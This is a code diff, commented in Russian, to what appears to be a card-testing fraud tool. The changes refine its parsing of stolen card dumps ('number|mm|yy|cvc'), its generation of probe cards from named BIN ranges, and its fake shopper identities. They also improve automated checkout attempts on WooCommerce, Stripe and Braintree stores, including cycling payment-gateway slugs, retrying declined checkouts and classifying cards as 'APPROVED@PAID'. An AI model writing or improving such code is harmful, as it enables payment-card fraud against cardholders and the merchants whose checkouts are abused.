@@ -103,9 +103,10 @@ _NL_STREETS = ["Damstraat", "Kalverstraat", "Hoogstraat", "Witte de Withstraat",
 
 def geo_identity_fields(country_code: str = "US") -> dict:
     """Случайный адрес из пула страны; неизвестная страна → US."""
-    pool = GEO_POOLS.get((country_code or "US").upper(), GEO_POOLS["US"])
+    cc = (country_code or "US").upper()
+    pool = GEO_POOLS.get(cc, GEO_POOLS["US"])
     city, state, zc = random.choice(pool)
-    if (country_code or "US").upper() == "NL":
+    if cc == "NL":
         street = f"{random.choice(_NL_STREETS)} {random.randint(1, 200)}"
     else:
         street = f"{random.randint(100, 9999)} {random.choice(_STREETS)} Street"
@@ -114,7 +115,7 @@ def geo_identity_fields(country_code: str = "US") -> dict:
         "city": city,
         "state": state,
         "postal_code": zc,
-        "country": (country_code or "US").upper() if country_code in GEO_POOLS else "US",
+        "country": cc if cc in GEO_POOLS else "US",
     }
 
 # BIN-пулы пробников: живые диапазоны MC/VISA, 16 цифр
@@ -139,7 +140,9 @@ _ANTIPUBLIC_A2 = {
 
 
 def check_luhn(card_num: str) -> bool:
-    digits = [int(d) for d in card_num if d.isdigit()]
+    digits = [int(d) for d in str(card_num) if d.isdigit()]
+    if len(digits) < 13 or len(digits) > 19:
+        return False
     checksum = 0
     for i, d in enumerate(reversed(digits)):
         if i % 2 == 1:
@@ -170,7 +173,7 @@ def gen_probe_card(bin_prefix: str | None = None) -> dict:
     body = "".join(random.choices(string.digits, k=15 - len(prefix)))
     partial = prefix + body
     mm = f"{random.randint(1, 12):02d}"
-    yy = str(random.randint(1, 4) + 2026)
+    yy = str(random.randint(1, 4) + datetime.now().year)
     return {
         "number": partial + str(luhn_check_digit(partial)),
         "mm": mm,
@@ -181,21 +184,68 @@ def gen_probe_card(bin_prefix: str | None = None) -> dict:
     }
 
 
+def extract_pan(raw: str) -> str:
+    """Извлекает только номер карты (PAN 13-19 цифр) из любой строки."""
+    clean = str(raw).strip()
+    if not clean:
+        return ""
+    first_chunk = re.split(r"[|:;/]", clean)[0].strip()
+    tokens = first_chunk.split()
+    if len(tokens) >= 4:
+        if all(len(t) == 4 and t.isdigit() for t in tokens[:4]):
+            return "".join(tokens[:4])
+        if len(tokens[0]) >= 13 and tokens[0].isdigit():
+            return tokens[0]
+    elif len(tokens) > 1:
+        if len(tokens[0]) >= 13 and tokens[0].isdigit():
+            return tokens[0]
+        joined = "".join(tokens)
+        if 13 <= len(joined) <= 19 and joined.isdigit():
+            return joined
+
+    digits = "".join(ch for ch in tokens[0] if ch.isdigit()) if tokens else ""
+    if len(digits) >= 13:
+        return digits[:19]
+    m = re.search(r"\b(\d{13,19})\b", clean)
+    return m.group(1) if m else digits
+
+
 def parse_card(raw: str) -> dict:
-    parts = raw.strip().split("|")
-    number = parts[0].strip()
-    mm = parts[1].strip().zfill(2)
-    yy = parts[2].strip()
-    yy = "20" + yy[-2:] if len(yy) <= 2 else yy
+    clean = str(raw).strip()
+    if "|" in clean:
+        parts = clean.split("|")
+    elif ":" in clean:
+        parts = clean.split(":")
+    elif "/" in clean and not clean.startswith("http"):
+        parts = clean.split("/")
+    else:
+        parts = clean.split()
+
+    if len(parts) < 3:
+        digits_chunks = re.findall(r"\d+", clean)
+        parts = digits_chunks if len(digits_chunks) >= 3 else parts
+
+    number = parts[0].strip() if len(parts) > 0 else ""
+    mm = parts[1].strip().zfill(2) if len(parts) > 1 else "01"
+    yy = parts[2].strip() if len(parts) > 2 else "2030"
+    yy_4 = "20" + yy[-2:] if len(yy) <= 2 else yy
+    yy_2 = yy_4[-2:]
     cvc_raw = parts[3].strip() if len(parts) > 3 else ""
-    # Пустой CVC → случайная генерация: даёт шанс честного incorrect_cvс-вердикта
-    # вместо гарантированного отказа на "000"
     cvc = cvc_raw if cvc_raw else f"{random.randint(0, 999):03d}"
-    return {"number": number, "month": mm, "year": yy, "cvc": cvc, "raw": raw.strip()}
+    return {
+        "number": number,
+        "month": mm,
+        "mm": mm,
+        "year": yy_4,
+        "yy": yy_4,
+        "yy2": yy_2,
+        "cvc": cvc,
+        "raw": clean,
+    }
 
 
 def mask_pan(raw: str) -> str:
-    num = raw.split("|")[0].strip()
+    num = extract_pan(raw)
     return f"{num[:6]}******{num[-4:]}" if len(num) >= 10 else num
 
 
@@ -975,8 +1025,8 @@ async def braintree_vbv_check(s, html: str, card_raw: str,
             "payment_method_nonce": "",
             "creditCard[cardholderName]": "",
             "creditCard[number]": card["number"],
-            "creditCard[expirationMonth]": card["mm"],
-            "creditCard[expirationYear]": card["yy"],
+            "creditCard[expirationMonth]": str(card.get("month") or card.get("mm")),
+            "creditCard[expirationYear]": str(card.get("year") or card.get("yy")),
             "creditCard[cvv]": card["cvc"],
             "billingAddress[postal_code]": "",
         }
@@ -993,8 +1043,8 @@ async def braintree_vbv_check(s, html: str, card_raw: str,
                       "expirationMonth expirationYear cvvResponseCode } } } }"),
             "variables": {"input": {"creditCard": {
                 "number": card["number"],
-                "expirationMonth": card["mm"],
-                "expirationYear": card["yy"],
+                "expirationMonth": str(card.get("month") or card.get("mm")),
+                "expirationYear": str(card.get("year") or card.get("yy")),
                 "cvv": card["cvc"]},
                 "options": {"validate": False}}},
             "operationName": "Tokenize",
@@ -1115,7 +1165,8 @@ async def store_api_confirm(s, root: str, pk: str, card_raw: str,
                 break
             r_add = await s.post(f"{api}/cart/add-item",
                                  params={"id": cand_p["id"], "quantity": "1"},
-                                 headers={"Nonce": nonce}, timeout=10)
+                                 headers={"Nonce": nonlocal_nonce[0]}, timeout=10)
+            _take_nonce(r_add)
             if r_add.status_code in (200, 201):
                 prod = cand_p
                 break
@@ -1149,7 +1200,7 @@ async def store_api_confirm(s, root: str, pk: str, card_raw: str,
                     break
                 # rates пустые → задать destination-адрес и перечитать
                 ident_pre = {**random_identity(country), **geo_identity_fields(country)}
-                await s.post(f"{api}/cart/update-customer",
+                r_uc = await s.post(f"{api}/cart/update-customer",
                              json={
                                  "shipping_address": {
                                      "first_name": ident_pre["first_name"],
@@ -1164,7 +1215,8 @@ async def store_api_confirm(s, root: str, pk: str, card_raw: str,
                                      "phone": "",
                                  },
                              },
-                             headers={"Nonce": nonce}, timeout=10)
+                             headers={"Nonce": nonlocal_nonce[0]}, timeout=10)
+                _take_nonce(r_uc)
             if rate_id:
                 r_sr = await s.post(f"{api}/cart/select-shipping-rate",
                              json={"rate_id": rate_id},
@@ -1252,6 +1304,7 @@ async def store_api_confirm(s, root: str, pk: str, card_raw: str,
         tried = ["stripe"]
         geo_fixed = False
         addr2_fixed = False
+        checkout_retried = False
         for attempt in range(10):
             r_co = await s.post(f"{api}/checkout", json=checkout_body,
                                 headers={"Nonce": nonlocal_nonce[0]}, timeout=20)
@@ -1267,21 +1320,41 @@ async def store_api_confirm(s, root: str, pk: str, card_raw: str,
                            if isinstance(d.get("data"), dict) else {}) or {}
             pm_err = data_params.get("payment_method", "") \
                 if isinstance(data_params, dict) else ""
-            if code == "rest_invalid_param" and pm_err:
+            # madatshop-кейс: process_payment_error «Der ausgewählte Zahlungsarten-Typ
+            # ist ungültig» — неверный slug шлюза, но валидные значения в ошибке НЕ
+            # перечислены. Эмитентные «card was declined» сюда не попадают (другой текст)
+            pm_type_invalid = (code == "woocommerce_rest_checkout_process_payment_error"
+                               and re.search(r"zahlungsarten.{0,10}typ|payment method type",
+                                             msg_raw, re.I))
+            if (code == "rest_invalid_param" and pm_err) or pm_type_invalid:
                 # сообщение локализовано (nl/fr/de/lt...), но сами slug'и шлюзов
                 # латинские — вытаскиваем их regexp'ом из всего текста ошибки
                 enum = set(re.findall(
-                    r"(?:stripe|ppcp|pronamic|woocommerce_payments|paypal)[a-z0-9_]*",
-                    pm_err))
-                # приоритет карточных шлюзов; не-страйповские обычно умерят наш pm_id,
-                # но при отсутствии stripe-* это последний шанс
+                    r"(?:stripe|ppcp|pronamic|woocommerce_payments|paypal)[a-z0-9_-]*",
+                    pm_err + " " + msg_raw))
+                # приоритет card-совместимых slug'ов; wallet/local-методы (alipay,
+                # klarna, sepa, oxxo...) наш Stripe card-pm не примет — не перебираем
+                card_plausible = ("stripe_cc", "stripe_card", "stripe_upm",
+                                  "ppcp_card", "woocommerce_payments",
+                                  "woocommerce_payments_card", "pronamic_pay")
+                wallet_rx = re.compile(
+                    r"alipay|wechat|amazon|klarna|kco|affirm|afterpay|clearpay|"
+                    r"blik|eps|bancontact|boleto|ideal|oxxo|sepa|us_bank|p24|"
+                    r"multibanco|link|cashapp|acss|bacs|becs|cheque|cod|giropay|"
+                    r"sofort|mybank|trustly|pay_upon_invoice")
                 order = sorted(
-                    (e for e in enum if e and e != "stripe"),
-                    key=lambda e: (not e.startswith("stripe"),
-                                   not e.startswith("stripe_cc"),
-                                   not e.startswith("ppcp_card"),
-                                   not e.startswith("pronamic_pay")))
+                    (e for e in enum if e and e != "stripe"
+                     and not wallet_rx.search(e)),
+                    key=lambda e: (e not in card_plausible,
+                                   not e.startswith("stripe")))
                 nxt = next((e for e in order if e not in tried), None)
+                if nxt is None and pm_type_invalid:
+                    # slug'ы в тексте ошибки не перечислены — перебор карточных
+                    # кандидатов (наш pm_id — card PaymentMethod)
+                    for cand in card_plausible:
+                        if cand not in tried:
+                            nxt = cand
+                            break
                 if nxt:
                     tried.append(nxt)
                     checkout_body["payment_method"] = nxt
@@ -1347,9 +1420,43 @@ async def store_api_confirm(s, root: str, pk: str, card_raw: str,
         p_status = pr.get("status") or pr.get("payment_status") or ""
         details_txt = _json.dumps(pr.get("payment_details", []), ensure_ascii=False)
 
+        # cherryarts-кейс: процессинг просит повторить («Please retry») — один
+        # повтор checkout теми же данными; nonce уже свежий из прошлого ответа
+        if (p_status == "failure" and not checkout_retried
+                and re.search(r"please retry|try again|processing failed",
+                              details_txt, re.I)):
+            checkout_retried = True
+            r_co = await s.post(f"{api}/checkout", json=checkout_body,
+                                headers={"Nonce": nonlocal_nonce[0]}, timeout=20)
+            _take_nonce(r_co)
+            txt = r_co.text
+            try:
+                d = _json.loads(txt)
+            except Exception:
+                d = {}
+            secrets = RE_CLIENT_SECRET.findall(txt)
+            pr = d.get("payment_result") or {}
+            p_status = pr.get("status") or pr.get("payment_status") or ""
+            details_txt = _json.dumps(pr.get("payment_details", []), ensure_ascii=False)
+
+        sec_val = ""
+        if secrets:
+            sec_val = secrets[0][0] if isinstance(secrets[0], (tuple, list)) else str(secrets[0])
         base = {"amount_cents": price_c, "currency": curr,
-                "pi_secret": secrets[0][0] if secrets else ""}
+                "pi_secret": sec_val}
         if p_status == "success":
+            # Woo Blocks success = «заказ размещён, редирект на оплату», НЕ «деньги
+            # получены» (кейс herbaura: заказ есть, PI не подтверждён, банк не тронут).
+            # Единственное доказательство оплаты — статус PaymentIntent у Stripe.
+            if sec_val:
+                pi = await stripe_retrieve_pi(s, pk, sec_val)
+                pi_st = (pi or {}).get("status") or "unreachable"
+                if pi_st == "succeeded":
+                    return {"status": "APPROVED@PAID",
+                            "detail": f"order {d.get('order_id', '')} paid (PI succeeded)", **base}
+                return {"status": "PI_PENDING",
+                        "detail": (f"order {d.get('order_id', '')} placed, PI={pi_st} — "
+                                   f"payment NOT confirmed"), **base}
             return {"status": "APPROVED@PAID",
                     "detail": f"order paid {d.get('order_id', '')}", **base}
         if p_status == "failure":
